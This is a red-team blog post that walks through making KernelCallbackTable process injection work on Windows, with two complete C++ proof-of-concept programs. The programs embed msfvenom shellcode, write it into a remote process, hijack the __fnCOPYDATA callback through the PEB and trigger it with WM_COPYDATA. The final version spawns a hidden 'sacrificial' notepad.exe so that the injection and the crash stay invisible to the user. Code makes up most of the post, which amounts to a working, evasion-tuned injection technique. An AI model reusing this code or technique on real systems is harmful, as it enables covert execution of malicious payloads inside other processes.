---
layout: post
title: "Adventures with KernelCallbackTable Injection"
date: 2022-04-21
categories: [redteam, maldev]
description: "A walkthrough on how I made KernelCallbackTable process injection work according to what I wanted."
header-img: /static/img/2022-04-21-kernelcallbacktable-injection/kct-injection-worked.gif
image: /static/img/2022-04-21-kernelcallbacktable-injection/kct-injection-worked.gif
---

Lately, I came across with `KernelCallbackTable` which could be abused to inject shellcode in a remote process. This method of process injection was used by [FinFisher/FinSpy](https://www.microsoft.com/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/) and [Lazarus](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/).

This post walks through the journey I took and the hurdles I encountered to make process injection via `KernelCallbackTable` work according to what I wanted.  

## The Problems

When I Googled about this technique, the very first result that I got was none other than the [post](https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/) written by [modexpblog](https://twitter.com/modexpblog). So for this experiment, I used the [code](https://github.com/odzhan/injection/blob/master/kct/kct.c) he provided as my basis and slightly modified it.

```cpp
#include <Windows.h>
#include <stdio.h>
#include "struct.h"

int main()
{
	// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c
	unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";
	SIZE_T payloadSize = sizeof(payload);

	// Find a window for explorer.exe
	HWND hWindow = FindWindow(L"Shell_TrayWnd", NULL);
	printf("[+] Window Handle: 0x%p\n", hWindow);

	// Obtain the process pid and open it
	DWORD pid;
	GetWindowThreadProcessId(hWindow, &pid);
	printf("[+] Process ID: %d\n", pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	printf("[+] Process Handle: 0x%p\n", hProcess);

	// Read PEB and KernelCallBackTable addresses
	PROCESS_BASIC_INFORMATION pbi;
	pNtQueryInformationProcess myNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	myNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	PEB peb;
	ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
	printf("[+] PEB Address: 0x%p\n", pbi.PebBaseAddress);

	KERNELCALLBACKTABLE kct;
	ReadProcessMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);
	printf("[+] KernelCallbackTable Address: 0x%p\n", peb.KernelCallbackTable);

	// Write the payload to remote process
	LPVOID payloadAddr = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, payloadAddr, payload, payloadSize, NULL);
	printf("[+] Payload Address: 0x%p\n", payloadAddr);

	// 4. Write the new table to the remote process
	LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr;
	WriteProcessMemory(hProcess, newKCTAddr, &kct, sizeof(kct), NULL);
	printf("[+] __fnCOPYDATA: 0x%p\n", kct.__fnCOPYDATA);

	// Update the PEB
	WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &newKCTAddr, sizeof(ULONG_PTR), NULL);
	printf("[+] Remote process PEB updated\n");

	// Trigger execution of payload
	COPYDATASTRUCT cds;
	WCHAR msg[] = L"Pwn";
	cds.dwData = 1;
	cds.cbData = lstrlen(msg) * 2;
	cds.lpData = msg;
	SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
	printf("[+] Payload executed\n");

	// Restore original KernelCallbackTable
	WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL);
	printf("[+] Original KernelCallbackTable restored\n");

	// Release memory for code and data
	VirtualFreeEx(hProcess, payloadAddr, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hProcess, newKCTAddr, 0, MEM_DECOMMIT | MEM_RELEASE);
	
	// Close handles
	CloseHandle(hWindow);
	CloseHandle(hProcess);
	printf("[+] Cleaned up\n");
}
```

The above PoC uses `explorer.exe` as the target process. This is done using the `FindWindow()` function to get a handle to the window class `Shell_TrayWnd`, which is associated with `explorer.exe`. Execution of the payload begins when the `SendMessage()` function is called. This happens since `__fnCOPYDATA`, which points to the payload's address, gets triggered when the `WM_COPYDATA` message is sent.

But why `explorer.exe` when there are other processes running on the system? That's because the `KernelCallbackTable` that is found within the PEB only gets initialized when `user32.dll`, used by GUI processes, is loaded into the process' memory. This means processes that do not load `user32.dll` won't have the `KernelCallbackTable` field in the PEB.

During my experiment, the PoC didn't work and it keeps on crashing `explorer.exe` right after updating the target process' PEB _(by executing the below line of code)_. While `explorer.exe` auto-restarts after the crash, the obtained window handle is now invalid; resulting in a failed execution of the payload when `SendMessage()` is called.

```cpp
// Update the PEB
WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &newKCTAddr, sizeof(ULONG_PTR), NULL);
```

![Explorer Crashed](/static/img/2022-04-21-kernelcallbacktable-injection/explorer-crashed.gif)

What if we target other GUI processes? I tried it by getting a handle to the window class `Notepad` _(using the code below)_ and have `notepad.exe` run before executing the code.
```cpp
HWND hWindow = FindWindow(L"Notepad", NULL);
```

And it worked! The payload gets executed **but** the target process still crashed right after the call to `SendMessage()`.

![Payload Executed but Target Process Crashed](/static/img/2022-04-21-kernelcallbacktable-injection/payload-worked-notepad-crashed.gif)

The problems I see with this method are:

1. You have to first enumerate the window classes available on the system. _(This is doable with `EnumWindows()` function.)_
2. The target process crashes no matter what. _(I tried targeting different GUI processes and window classes but they all crashed. Although in some instances, the payload gets executed and in some does not.)_
3. The crash is visible to the user.

## Other's Solution

[ORCA666](https://twitter.com/ORCA10K) found a way to solve this issue by not targeting `explorer.exe` and by loading [`user32.dll` in memory](https://gitlab.com/ORCA666/kcthijack/-/blob/main/KCTHijack/main.c#L175). However, his approach loads `user32.dll` in the current process' memory and the payload gets executed locally instead of being injected into another process. If you want to have a look at his approach, visit his [KCTHIJACK](https://gitlab.com/ORCA666/kcthijack) repo.

His solution is great but this is not what I wanted to do; that is injecting the payload in a remote process. 

## My Solution

Since crashing the remote process is inevitable, why not spawn a "sacrificial" process that will not be visible to the user? This is the solution that I came up with that goes according to what I wanted to do.

### First Attempt: FAILED!

To achieve my goal, I used `CreateProcess()` to spawn an instance of `notepad.exe` and set the process creation flag `dwFlags` to `CREATE_SUSPENDED` to make it "hidden". 
```cpp
CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
```

Well, that didn't work because a suspended process does not have any window in it.

![Suspened Process has no Window](/static/img/2022-04-21-kernelcallbacktable-injection/no-window.png)

No window means no handle to obtain so injection and execution of payload are not possible.
```powershell
[+] Window Handle: 0x0000000000000000
[+] Process ID: 0
[+] Process Handle: 0x0000000000000000
[+] PEB Address: 0x0000020C2A583CC0
[+] KernelCallbackTable Address: 0x0000000000000000
[+] Payload Address: 0x0000000000000000
[+] __fnCOPYDATA: 0x0000000000000000
[+] Remote process PEB updated
[+] Payload executed
[+] Original KernelCallbackTable restored
[+] Cleaned up
```

### Second Attempt: FAILED! (again)

Instead of resorting to the `CREATE_SUSPENDED` flag to hide the created process, I used the `dwFlags` and `wShowWindow` members of the `STARTUPINFO` structure and set their values to the following:
```cpp
si.dwFlags = STARTF_USESHOWWINDOW;
si.wShowWindow = SW_HIDE;
```

As for the process creation flag, I changed it from `CREATE_SUSPENDED` to `CREATE_NEW_CONSOLE`. I got the result that I wanted; the process is not visible to the user and it has a window. However, no handle was obtained so injection and execution of payload still did not happen.

![Created Process with Window](/static/img/2022-04-21-kernelcallbacktable-injection/process-has-window.png)

### Third Attempt: SUCCESS!

After some digging, the reason my second attempt failed is that I didn't give the created process enough time to initialize its inputs. A `Sleep()` function will fix the issue _(I tried it and it worked)_. However, I don't want to wait until the number of seconds passed in `Sleep()` lapsed. I used `WaitForInputIdle()` instead so it will only wait until the process has finished its initialization.
```cpp
WaitForInputIdle(pi.hProcess, 1000);
```

Here's the final code that I came up with.
```cpp
#include <Windows.h>
#include <stdio.h>
#include "struct.h"

int main()
{
	// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c
	unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";
	SIZE_T payloadSize = sizeof(payload);

	// Create a sacrifical process
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	// Wait for process initialization
	WaitForInputIdle(pi.hProcess, 1000);

	// Find a window for explorer.exe
	HWND hWindow = FindWindow(L"Notepad", NULL);
	printf("[+] Window Handle: 0x%p\n", hWindow);

	// Obtain the process pid and open it
	DWORD pid;
	GetWindowThreadProcessId(hWindow, &pid);
	printf("[+] Process ID: %d\n", pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	printf("[+] Process Handle: 0x%p\n", hProcess);

	// Read PEB and KernelCallBackTable addresses
	PROCESS_BASIC_INFORMATION pbi;
	pNtQueryInformationProcess myNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	myNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	PEB peb;
	ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
	printf("[+] PEB Address: 0x%p\n", pbi.PebBaseAddress);

	KERNELCALLBACKTABLE kct;
	ReadProcessMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);
	printf("[+] KernelCallbackTable Address: 0x%p\n", peb.KernelCallbackTable);

	// Write the payload to remote process
	LPVOID payloadAddr = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, payloadAddr, payload, payloadSize, NULL);
	printf("[+] Payload Address: 0x%p\n", payloadAddr);

	// 4. Write the new table to the remote process
	LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr;
	WriteProcessMemory(hProcess, newKCTAddr, &kct, sizeof(kct), NULL);
	printf("[+] __fnCOPYDATA: 0x%p\n", kct.__fnCOPYDATA);

	// Update the PEB
	WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &newKCTAddr, sizeof(ULONG_PTR), NULL);
	printf("[+] Remote process PEB updated\n");

	// Trigger execution of payload
	COPYDATASTRUCT cds;
	WCHAR msg[] = L"Pwn";
	cds.dwData = 1;
	cds.cbData = lstrlen(msg) * 2;
	cds.lpData = msg;
	SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
	printf("[+] Payload executed\n");
}
```
> _**NOTE:** I already removed the cleanup code (like restoring the original `KernelCallbackTable`) because they don't matter anymore since the target process has already crashed and exited._

> _The full project can be found [here](https://github.com/capt-meelo/KernelCallbackTable-Injection)._

And here it is in action.

![Successful KernelCallbackTable Injection](/static/img/2022-04-21-kernelcallbacktable-injection/kct-injection-worked.gif)

## Conclusion

That's it! That is how I modified the base PoC to make `KernelCallbackTable` process injection work according to what I wanted.

If anyone knows other solutions, like making the remote process not crash, I'm happy to hear it. :)